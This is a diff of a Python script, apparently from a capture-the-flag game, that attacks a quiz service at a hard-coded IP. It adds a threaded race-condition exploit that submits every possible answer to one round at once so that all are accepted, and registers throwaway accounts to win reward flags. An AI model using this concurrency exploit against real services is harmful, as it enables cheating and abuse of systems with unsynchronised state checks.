@@ -1,3 +1,4 @@
+import base64
 import threading
 import uuid
 import random
@@ -9,37 +10,39 @@ URL = 'http://104.248.87.99:13337'
 RUSTEST_ID = '12c09e1b-61f1-4b45-9ead-e8d150969256'
 
 
-def get_question(test_id: str, user_id: str):
+def get_question(test_id: str, token: str):
     return requests.get(
-        f'{URL}/rustest/{test_id}',
-        headers={'Authorization': f'Bearer {user_id}'},
+        f'{URL}/rustest/{test_id}/solve',
+        headers={'Authorization': f'Bearer {token}'},
     ).json()
 
 
-def submit_answer(test_id: str, user_id: str, answer: int) -> dict:
-    print(f'submitting answer for {test_id} with answer {answer} by user {user_id}')
-
+def submit_answer(test_id: str, token: str, answer: int, round_idx: int) -> dict:
     resp = requests.post(
         f'{URL}/rustest/{test_id}/submit',
-        headers={'Authorization': f'Bearer {user_id}'},
-        json={'round': 0, 'answer': answer}
+        headers={'Authorization': f'Bearer {token}'},
+        json={'round': round_idx, 'answer': answer}
     )
 
     try:
-        data = resp.json()
-        print(f'{{ {answer} }} -> {data}')
-        return data
+        return resp.json()
     except requests.exceptions.JSONDecodeError:
-        return {'status_code': resp.status_code}
+        return {'status_code': resp.status_code, 'error': resp.text}
 
 
-def test() -> str:
-    user_id = str(uuid.uuid4())
-
+def try_sploit_on_test_round(token: str, test_id: str, round_idx: int, num_answers: int) -> bool:
     threads = []
-    for i in range(2):
+    responses = [None for _ in range(num_answers)]
+
+    def make_resp(index: int):
+        print(index)
+        resp = submit_answer(test_id, token, index, round_idx)
+        print(resp)
+        responses[index] = resp
+
+    for i in range(num_answers):
         threads.append(threading.Thread(
-            target=(lambda idx: lambda: submit_answer(RUSTEST_ID, user_id, idx))(i)
+            target=(lambda idx: lambda: make_resp(idx))(i)
         ))
 
     for th in threads:
@@ -48,8 +51,9 @@ def test() -> str:
     for th in threads:
         th.join()
 
-    final = get_question(RUSTEST_ID, user_id)
-    return final['final_state']['result']
+    rounds = [st.get('round', -1) for st in responses]
+    print(rounds)
+    return all(val == rounds[0] for val in rounds) and rounds[0] != -1
 
 
 def register_user(login: str, password: str) -> str:
@@ -85,43 +89,38 @@ def gen_test(test_idx: int, question_num: int, answers_num: int) -> dict:
             {
                 'question': f'Гномий вопрос {i + 1} в гномьем тесте {test_idx}',
                 'allowed_answers': allowed_answers,
-                'correct_idx': random.randint(1, 4),
+                'correct_idx': random.randint(0, answers_num - 1),
             }
         )
 
     return {
         'name': f'Великий гномий тест на русса {test_idx + 1}',
-        'description': f'ВеликоГномий тест {i + 1} позволят проверить русс ли гном или же ящер гнусный',
-        'reward': f'GnomFlag{{velikaya_nagrada_{i + 1}}}',
+        'description': f'ВеликоГномий тест {test_idx + 1} позволят проверить русс ли гном или же ящер гнусный',
+        'reward': f'GnomFlag{{velikaya_nagrada_{test_idx + 1}}}',
         'questions': questions,
     }
 
 
 def main():
-    # token = login_user('lozhkinGnom', 'penis228')
-    # for i in range(200):
-    #     rustest = create_rustest(
-    #         token,
-    #         gen_test(i, QUESTION_NUM, ANSWERS_AMOUNT)
-    #     )
-    #
-    #     print(rustest)
-    #
-    for i in range(400):
-        token = register_user(f'user{i}', f'password_{i}')
-        print(token)
-    # win_cnt = 0
-    # lose_cnt = 0
-    # for i in range(100):
-    #     res = test()
-    #     if res == 'Win':
-    #         win_cnt += 1
-    #     else:
-    #         lose_cnt += 1
+    test_id = '5f2c6d02-2afb-450c-81df-be46b868c3fd'
+    win = 0
+    lose = 0
+    for attempt in range(1):
+        token = register_user(base64.b32encode(random.randbytes(5)).decode().strip('='), 'penis228')
+        print('registered')
+        success = try_sploit_on_test_round(token, test_id, 0, 4)
+        print(success)
+        if success:
+            win += 1
+        else:
+            lose += 1
 
-    # print(f'win: {win_cnt}')
-    # print(f'lose: {lose_cnt}')
+    print(f'win: {win}')
+    print(f'lose: {lose}')
 
 
 if __name__ == '__main__':
-    main()
+    token = register_user(base64.b32encode(random.randbytes(5)).decode().strip('='), 'penis228')
+    test = gen_test(1337, 10, 4)
+    print(create_rustest(token, test))
+    # main()
